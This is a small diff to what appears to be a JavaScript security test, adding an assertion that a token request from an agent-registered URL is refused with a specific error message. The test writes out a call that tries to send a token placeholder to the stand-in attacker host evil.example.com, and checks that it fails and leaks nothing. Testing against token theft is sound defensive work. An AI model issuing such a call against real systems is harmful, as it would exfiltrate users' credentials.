@@ -387,6 +387,7 @@ test('NEGATIVE an agent tokenUrl registered before a token is typed in, and rest
     request: call('https://evil.example.com/token', token.placeholder),
   });
   assert.equal(stolen.error.code, 'EACCES');
+  assert.match(stolen.error.message, /NOTES_MCP isn't a credential of notes/);
   assert.ok(!JSON.stringify(stolen).includes(TOKEN));
   assert.deepEqual(await pins(page), []);
   const view = (await page.evaluate(() => window.harness.call('list'))).list.secrets.find(
